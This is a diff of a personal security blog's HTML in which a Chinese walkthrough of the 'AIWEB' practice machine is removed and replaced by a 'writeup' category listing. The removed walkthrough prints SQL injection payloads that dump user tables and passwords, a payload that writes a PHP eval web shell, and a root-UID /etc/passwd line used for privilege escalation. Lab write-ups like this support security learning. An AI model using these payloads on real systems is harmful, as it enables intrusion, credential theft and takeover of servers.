@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="靶机渗透测试," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -79,29 +79,12 @@
 
 
 
-<meta name="description" content="主机发现 端口扫描发现只开放了80端口，有robots.txt,泄露目录  访问 se3reTdir777路径，发现存在注入漏洞 1234567891011# systemUser,user表uid=1&amp;apos; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_sche">
-<meta name="keywords" content="靶机渗透测试">
-<meta property="og:type" content="article">
-<meta property="og:title" content="AIWEB">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;01&#x2F;AIWEB&#x2F;index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="t0ng">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;categories&#x2F;writeup&#x2F;index.html">
 <meta property="og:site_name" content="t0ng">
-<meta property="og:description" content="主机发现 端口扫描发现只开放了80端口，有robots.txt,泄露目录  访问 se3reTdir777路径，发现存在注入漏洞 1234567891011# systemUser,user表uid=1&amp;apos; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_sche">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401171003477.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401171032473.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401171223469.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401173107920.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401215721870.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401215734215.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401220113740.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401220842112.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401221106333.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401223536061.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401224040961.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401224628398.png">
-<meta property="og:updated_time" content="2020-04-01T14:47:45.095Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;AIWEB&#x2F;image-20200401171003477.png">
 
 
 
@@ -131,13 +114,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/04/01/AIWEB/"/>
+  <link rel="canonical" href="http://yoursite.com/categories/writeup/"/>
 
 
 
 
 
-  <title>AIWEB | t0ng</title>
+  <title>Category: writeup | t0ng</title>
   
 
 
@@ -156,7 +139,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -294,171 +277,111 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-expand">
-    
+  
+  
+  
+  <div class="post-block category">
 
-  
+    <div id="posts" class="posts-collapse">
+      <div class="collection-title">
+        <h1>writeup<small>Category</small>
+        </h1>
+      </div>
 
-  
-  
-  
+      
+        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/01/AIWEB/">
+    <header class="post-header">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="t0ng">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="t0ng">
-    </span>
-
-    
-      <header class="post-header">
-
+      <h2 class="post-title">
         
-        
-          <h1 class="post-title" itemprop="name headline">AIWEB</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
+            <a class="post-title-link" href="/2020/01/05/Wechall-Training-Regex/" itemprop="url">
               
-                <span class="post-meta-item-text">Posted on</span>
+                <span itemprop="name">Wechall-Training-Regex</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-01T17:08:56+08:00">
-                2020-04-01
-              </time>
-            
+            </a>
+        
+      </h2>
 
-            
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated"
+              datetime="2020-01-05T11:40:19+08:00"
+              content="2020-01-05" >
+          01-05
+        </time>
+      </div>
 
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><img src="/images/AIWEB/image-20200401171003477.png" alt="image-20200401171003477"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>发现只开放了80端口，有<code>robots.txt</code>,泄露目录</p>
-<p><img src="/images/AIWEB/image-20200401171032473.png" alt="image-20200401171032473"></p>
-<h2 id="访问-se3reTdir777路径，发现存在注入漏洞"><a href="#访问-se3reTdir777路径，发现存在注入漏洞" class="headerlink" title="访问 se3reTdir777路径，发现存在注入漏洞"></a>访问 se3reTdir777路径，发现存在注入漏洞</h2><p><img src="/images/AIWEB/image-20200401171223469.png" alt="image-20200401171223469"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemUser,user表</span></span><br><span class="line">uid=1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23&amp;Operation=Submit</span><br><span class="line"><span class="meta">#</span><span class="bash">  id,userName,password</span></span><br><span class="line">uid=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x73797374656d55736572%23&amp;Operation=Submit</span><br><span class="line"><span class="meta">#</span><span class="bash"> t00r,aiweb1pwn,u3er</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RmFrZVVzZXJQYXNzdzByZA==, FakeUserPassw0rd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ==,MyEvilPass_f908sdaf9_sadfasf0sa</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> TjB0VGhpczBuZUFsczA=, N0tThis0neAls0</span></span><br><span class="line">uid=1' and 1=2 union select 1,group_concat(userName),group_concat(password) from systemUser%23&amp;Operation=Submit</span><br><span class="line"><span class="meta">#</span><span class="bash"> id,firstName,lastName</span></span><br><span class="line">uid=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x75736572%23&amp;Operation=Submit</span><br></pre></td></tr></table></figure>
-
-<h3 id="扫描路径"><a href="#扫描路径" class="headerlink" title="扫描路径"></a>扫描路径</h3><p><img src="/images/AIWEB/image-20200401173107920.png" alt="image-20200401173107920"></p>
-<h4 id="访问-m3diNf0-info-php，找到webroot"><a href="#访问-m3diNf0-info-php，找到webroot" class="headerlink" title="访问/m3diNf0/info.php，找到webroot"></a>访问/m3diNf0/info.php，找到webroot</h4><p><code>/home/www/html/web1x443290o2sdf92213</code></p>
-<h3 id="sql写webshell"><a href="#sql写webshell" class="headerlink" title="sql写webshell"></a>sql写webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=1&apos; and 1=2 union select 1,&quot;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&quot;,3 into outfile &apos;/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/3.php&apos;%23&amp;Operation=Submit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/AIWEB/image-20200401215721870.png" alt="image-20200401215721870"></p>
-<p><img src="/images/AIWEB/image-20200401215734215.png" alt="image-20200401215734215"></p>
-<h3 id="菜刀连接上传大马，冰蝎连接"><a href="#菜刀连接上传大马，冰蝎连接" class="headerlink" title="菜刀连接上传大马，冰蝎连接"></a>菜刀连接上传大马，冰蝎连接</h3><p><img src="/images/AIWEB/image-20200401220113740.png" alt="image-20200401220113740"></p>
-<h3 id="python反弹shell得到标准终端"><a href="#python反弹shell得到标准终端" class="headerlink" title="python反弹shell得到标准终端"></a>python反弹shell得到标准终端</h3><p><img src="/images/AIWEB/image-20200401220842112.png" alt="image-20200401220842112"></p>
-<h3 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h3><p>发现其中一个用户与之前的数据库爆出的用户名一致</p>
-<p><img src="/images/AIWEB/image-20200401221106333.png" alt="image-20200401221106333"></p>
-<h4 id="切换用户，没有发现"><a href="#切换用户，没有发现" class="headerlink" title="切换用户，没有发现"></a>切换用户，没有发现</h4><p><img src="/images/AIWEB/image-20200401223536061.png" alt="image-20200401223536061"></p>
-<h4 id="发现www-data对passwd文件可读写"><a href="#发现www-data对passwd文件可读写" class="headerlink" title="发现www-data对passwd文件可读写"></a>发现www-data对passwd文件可读写</h4><p><img src="/images/AIWEB/image-20200401224040961.png" alt="image-20200401224040961"></p>
-<h4 id="修改-aiweb1pwn用户组为"><a href="#修改-aiweb1pwn用户组为" class="headerlink" title="修改 aiweb1pwn用户组为"></a>修改 aiweb1pwn用户组为</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aiweb1pwn:x:0:0:/home/aiweb1pwn:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<h3 id="重新切换用户，获得root权限"><a href="#重新切换用户，获得root权限" class="headerlink" title="重新切换用户，获得root权限"></a>重新切换用户，获得root权限</h3><p><img src="/images/AIWEB/image-20200401224628398.png" alt="image-20200401224628398"></p>
-
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 靶机渗透测试</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2020/04/01/Lazysysadmin/" rel="next" title="Lazysysadmin">
-                <i class="fa fa-chevron-left"></i> Lazysysadmin
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/04/02/Machine-Matrix/" rel="prev" title="Machine_Matrix">
-                Machine_Matrix <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+    </header>
   </article>
 
 
+      
+        
 
-    <div class="post-spread">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      <h2 class="post-title">
+        
+            <a class="post-title-link" href="/2020/01/04/Wechall-Training-Encodings/" itemprop="url">
+              
+                <span itemprop="name">Wechall-Training_Encodings</span>
+              
+            </a>
+        
+      </h2>
+
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated"
+              datetime="2020-01-04T18:50:56+08:00"
+              content="2020-01-04" >
+          01-04
+        </time>
+      </div>
+
+    </header>
+  </article>
+
+
+      
+        
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      <h2 class="post-title">
+        
+            <a class="post-title-link" href="/2019/12/13/sqli_writeup/" itemprop="url">
+              
+                <span itemprop="name">sqli_writeup</span>
+              
+            </a>
+        
+      </h2>
+
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated"
+              datetime="2019-12-13T10:28:54+08:00"
+              content="2019-12-13" >
+          12-13
+        </time>
+      </div>
+
+    </header>
+  </article>
+
+
       
     </div>
+
   </div>
+  
+  
+  
+
+  
+
 
 
           </div>
@@ -466,10 +389,6 @@
 
 
           
-
-  
-
-
 
         </div>
         
@@ -490,17 +409,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -515,12 +425,21 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-count">32</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
             
 
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
             
 
             
@@ -528,7 +447,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -551,22 +470,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#主机发现"><span class="nav-number">1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口扫描"><span class="nav-number">2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#访问-se3reTdir777路径，发现存在注入漏洞"><span class="nav-number">3.</span> <span class="nav-text">访问 se3reTdir777路径，发现存在注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描路径"><span class="nav-number">3.1.</span> <span class="nav-text">扫描路径</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#访问-m3diNf0-info-php，找到webroot"><span class="nav-number">3.1.1.</span> <span class="nav-text">访问/m3diNf0/info.php，找到webroot</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql写webshell"><span class="nav-number">3.2.</span> <span class="nav-text">sql写webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#菜刀连接上传大马，冰蝎连接"><span class="nav-number">3.3.</span> <span class="nav-text">菜刀连接上传大马，冰蝎连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python反弹shell得到标准终端"><span class="nav-number">3.4.</span> <span class="nav-text">python反弹shell得到标准终端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看用户"><span class="nav-number">3.5.</span> <span class="nav-text">查看用户</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#切换用户，没有发现"><span class="nav-number">3.5.1.</span> <span class="nav-text">切换用户，没有发现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#发现www-data对passwd文件可读写"><span class="nav-number">3.5.2.</span> <span class="nav-text">发现www-data对passwd文件可读写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修改-aiweb1pwn用户组为"><span class="nav-number">3.5.3.</span> <span class="nav-text">修改 aiweb1pwn用户组为</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#重新切换用户，获得root权限"><span class="nav-number">3.6.</span> <span class="nav-text">重新切换用户，获得root权限</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
@@ -707,10 +610,6 @@
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
